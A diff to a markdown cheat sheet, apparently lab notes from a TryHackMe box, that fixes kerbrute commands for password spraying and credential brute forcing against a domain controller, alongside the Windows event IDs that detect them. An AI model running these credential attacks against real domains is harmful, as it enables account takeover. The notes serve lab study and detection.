@@ -49,7 +49,7 @@ Logged event(s):
 
 ### Password spray
 
-`~/tools/kerbrute passwordspray -d domain.com --dc 10.10.10.10 domain_users password123`
+`~/tools/kerbrute passwordspray -d domain.com --dc 10.10.10.10 domain_users.txt password123`
 
 ```sh
 ┌──(kali㉿proxli)-[~/boxes/thm/attacktive]
@@ -118,9 +118,9 @@ Logged event(s):
 [4768 - A Kerberos authentication ticket (TGT) was requested](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768)
 [4771 - Kerberos pre-authentication failed](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4771)
 
-### Brute Force with stdin info
+### Brute Force with creds in file
 
-`cat creds-pairs.txt | ~/tools/kerbrute ** **-d domain.com --dc 10.10.10.10 -`
+`~/tools/kerbrute bruteforce -d domain.com --dc 10.10.10.10 creds-pairs.txt`
 where cread-pairs.txt has the format user:pass, one pair per line
 
 ```sh
